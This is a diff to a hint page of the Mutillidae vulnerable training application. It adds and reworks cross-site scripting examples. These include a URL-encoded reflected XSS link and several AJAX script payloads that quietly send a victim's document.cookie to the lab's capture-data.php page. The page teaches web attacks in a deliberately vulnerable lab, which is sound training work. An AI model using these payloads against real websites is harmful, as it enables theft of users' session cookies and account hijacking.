@@ -181,9 +181,48 @@
 <code>
 	http://[ip-address-of-mutillidae]/mutillidae/index.php?page=user-info.php&username=%3Cscript%3Enew%20Image().src%3D%22http%3A%2F%2Fmutillidae.local%2Fcapture-data.php%3Fcookie%3D%22%2BencodeURI(document.cookie)%3B%3C%2Fscript%3E&password=&user-info-php-submit-button=View+Account+Details
 </code>
+<br/><br/>
+			<span class="report-header">Examples - Stealing cookies quietly with AJAX</span>
+			<br/><br/>	
+			This example forwards the cookies to the Mutillidae Capture Data page using an AJAX
+			request running in the background
+			<br/>
+<code>
+&lt;script&gt;
+	var lXMLHTTP;
+	try{ 
+		var lData = &quot;data=&quot; + encodeURIComponent(document.cookie);
+		var lHost = &quot;localhost&quot;;
+		var lProtocol = &quot;http&quot;;
+		var lFilePath = &quot;/mutillidae/capture-data.php&quot;;
+		var lAction = lProtocol + &quot;://&quot; + lHost + lFilePath;
+		var lMethod = &quot;POST&quot;;
 
+		try {
+			lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); 
+		}catch (e) { 
+			try { 
+				lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); 
+			}catch (e) { 
+				try { 
+					lXMLHTTP = new XMLHttpRequest(); 
+				}catch (e) { 
+					alert(e.message);/*For testing only*/
+				} 
+			} 
+		}/*end try*/
 
+		lXMLHTTP.onreadystatechange = function(){};
+		lXMLHTTP.open(lMethod, lAction, true);
+		lXMLHTTP.setRequestHeader(&quot;Host&quot;, lHost); 
+		lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);			
+		lXMLHTTP.send(lData);
 
+	}catch(e){
+		alert(e.message);/*For testing only*/
+	} 
+&lt;/script&gt;
+</code>
 			<br/><br/>
 			<span class="report-header">Examples - HTML Injection</span>
 			<br/><br/>	
@@ -195,84 +234,84 @@
 			<br/><br/>	
 			AJAX can make the XSS more stealthy
 			<br/><br/>			
-			<span class="report-header">Example (For non-Samurai WTF users)</span>
+			<span class="report-header">Example (Mutillidae running at localhost)</span>
 			<br/><br/>
-			<textarea cols="80" rows="20">
-			&lt;script&gt;
-				var lXMLHTTP;
-				try{ 
-					var lData = &quot;data=&quot; + encodeURIComponent(document.cookie);
-					var lHost = &quot;localhost&quot;;
-					var lProtocol = &quot;http&quot;;
-					var lFilePath = &quot;/mutillidae/capture-data.php&quot;;
-					var lAction = lProtocol + &quot;://&quot; + lHost + lFilePath;
-					var lMethod = &quot;POST&quot;;
-			
-					try {
-						lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); 
+<code>		
+&lt;script&gt;
+		var lXMLHTTP;
+		try{ 
+			var lData = &quot;data=&quot; + encodeURIComponent(document.cookie);
+			var lHost = &quot;localhost&quot;;
+			var lProtocol = &quot;http&quot;;
+			var lFilePath = &quot;/mutillidae/capture-data.php&quot;;
+			var lAction = lProtocol + &quot;://&quot; + lHost + lFilePath;
+			var lMethod = &quot;POST&quot;;
+	
+			try {
+				lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); 
+			}catch (e) { 
+				try { 
+					lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); 
+				}catch (e) { 
+					try { 
+						lXMLHTTP = new XMLHttpRequest(); 
 					}catch (e) { 
-						try { 
-							lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); 
-						}catch (e) { 
-							try { 
-								lXMLHTTP = new XMLHttpRequest(); 
-							}catch (e) { 
-								alert(e.message);/*For testing only*/
-							} 
-						} 
-					}/*end try*/
-			
-					lXMLHTTP.onreadystatechange = function(){};
-					lXMLHTTP.open(lMethod, lAction, true);
-					lXMLHTTP.setRequestHeader(&quot;Host&quot;, lHost); 
-					lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);			
-					lXMLHTTP.send(lData);
-			
-				}catch(e){
+						alert(e.message);/*For testing only*/
+					} 
+				} 
+			}/*end try*/
+	
+			lXMLHTTP.onreadystatechange = function(){};
+			lXMLHTTP.open(lMethod, lAction, true);
+			lXMLHTTP.setRequestHeader(&quot;Host&quot;, lHost); 
+			lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);			
+			lXMLHTTP.send(lData);
+	
+		}catch(e){
+			alert(e.message);/*For testing only*/
+		} 
+&lt;/script&gt;
+</code>
+			<br/><br/>
+			<span class="report-header">Example (Mutillidae running on Apache virtual host)</span>
+			<br/><br/>
+<code>
+&lt;script&gt;
+	var lXMLHTTP;
+	try{ 
+		var lData = &quot;data=&quot; + encodeURIComponent(document.cookie);
+		var lHost = &quot;mutillidae.local&quot;;
+		var lProtocol = &quot;http&quot;;
+		var lFilePath = &quot;/capture-data.php&quot;;
+		var lAction = lProtocol + &quot;://&quot; + lHost + lFilePath;
+		var lMethod = &quot;POST&quot;;
+
+		try {
+			lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); 
+		}catch (e) { 
+			try { 
+				lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); 
+			}catch (e) { 
+				try { 
+					lXMLHTTP = new XMLHttpRequest(); 
+				}catch (e) { 
 					alert(e.message);/*For testing only*/
 				} 
-			&lt;/script&gt;
-			</textarea>
-			<br/><br/>
-			<span class="report-header">Example (For Samurai WTF)</span>
-			<br/><br/>
-			<textarea cols="80" rows="20">
-			&lt;script&gt;
-				var lXMLHTTP;
-				try{ 
-					var lData = &quot;data=&quot; + encodeURIComponent(document.cookie);
-					var lHost = &quot;mutillidae&quot;;
-					var lProtocol = &quot;http&quot;;
-					var lFilePath = &quot;/capture-data.php&quot;;
-					var lAction = lProtocol + &quot;://&quot; + lHost + lFilePath;
-					var lMethod = &quot;POST&quot;;
-			
-					try {
-						lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); 
-					}catch (e) { 
-						try { 
-							lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); 
-						}catch (e) { 
-							try { 
-								lXMLHTTP = new XMLHttpRequest(); 
-							}catch (e) { 
-								alert(e.message);/*For testing only*/
-							} 
-						} 
-					}/*end try*/
-			
-					lXMLHTTP.onreadystatechange = function(){};
-					lXMLHTTP.open(lMethod, lAction, true);
-					lXMLHTTP.setRequestHeader(&quot;Host&quot;, lHost); 
-					lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);			
-					lXMLHTTP.send(lData);
-			
-				}catch(e){
-					alert(e.message);/*For testing only*/
-				} 
-			&lt;/script&gt;
-			</textarea>
-			<br/><br/>
+			} 
+		}/*end try*/
+
+		lXMLHTTP.onreadystatechange = function(){};
+		lXMLHTTP.open(lMethod, lAction, true);
+		lXMLHTTP.setRequestHeader(&quot;Host&quot;, lHost); 
+		lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);			
+		lXMLHTTP.send(lData);
+
+	}catch(e){
+		alert(e.message);/*For testing only*/
+	} 
+&lt;/script&gt;
+</code>
+			<br/>
 			Note that some characters which are reserved in databases are also reserved
 			in web servers. If submitting injections directly via an interception proxy 
 			like Burp-Suite, URL encode the injection to avoid a syntax error on the
